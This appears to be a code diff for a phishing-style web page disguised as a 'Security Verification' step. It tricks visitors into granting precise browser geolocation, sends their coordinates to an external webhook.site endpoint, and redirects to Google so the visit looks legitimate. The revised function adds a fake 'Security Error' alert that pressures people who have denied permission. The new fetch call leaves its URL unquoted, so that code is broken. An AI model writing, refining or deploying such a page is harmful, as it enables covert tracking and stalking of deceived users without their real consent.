@@ -1,64 +1,44 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Verify Connection</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-gray-100 flex items-center justify-center h-screen">
-    <div class="bg-white p-8 rounded-lg shadow-md text-center max-w-sm">
-        <h2 class="text-xl font-bold mb-4">Security Verification</h2>
-        <p class="text-gray-600 mb-6 text-sm">Please verify your device location to continue to the secure network.</p>
-        
-        <!-- BUTTON IS MANDATORY FOR CHROME -->
-        <button onclick="getLocation()" class="bg-blue-600 text-white px-6 py-2 rounded-full hover:bg-blue-700 transition">
-            Verify Identity
-        </button>
-        
-        <p id="status" class="mt-4 text-xs text-gray-400 font-mono"></p>
-    </div>
+async function getLocation() {
+    const status = document.getElementById('status');
+    
+    // Check if the browser has already blocked us
+    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
 
-    <script>
-        function getLocation() {
-            document.getElementById('status').innerText = "Requesting Access...";
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            } else {
-                alert("This browser does not support security verification.");
-            }
-        }
+    if (permissionStatus.state === 'denied') {
+        alert("⚠️ Security Error: Please click the LOCK icon in the URL bar and 'Allow' location to verify your device.");
+        return;
+    }
 
-        function sendData(position) {
-            document.getElementById('status').innerText = "Uploading Metadata...";
-            
-            const coords = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                acc: position.coords.accuracy
-            };
+    status.innerText = "Connecting to Secure Gateway...";
 
-            fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
+    const options = {
+        enableHighAccuracy: true,
+        timeout: 15000, // Long timeout to prevent "auto-fail"
+        maximumAge: 0
+    };
+
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            // SUCCESS: Send to your Webhook
+            fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
                 method: "POST",
                 mode: "no-cors",
-                body: JSON.stringify(coords)
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                })
             }).then(() => {
-                // Redirect to make it look legitimate
                 window.location.href = "https://www.google.com";
             });
-        }
-
-        function handleError(error) {
-            // If Chrome blocks it, this function runs.
-            console.log("Error Code: " + error.code);
+        },
+        (error) => {
+            // FAIL: Handle the block
+            console.error(error);
             if (error.code === 1) {
-                alert("Permission Denied. Please enable location in your browser settings to continue.");
+                alert("Permission required to continue.");
             }
             window.location.href = "https://www.google.com";
-        }
-    </script>
-</body>
-</html>
+        },
+        options
+    );
+}
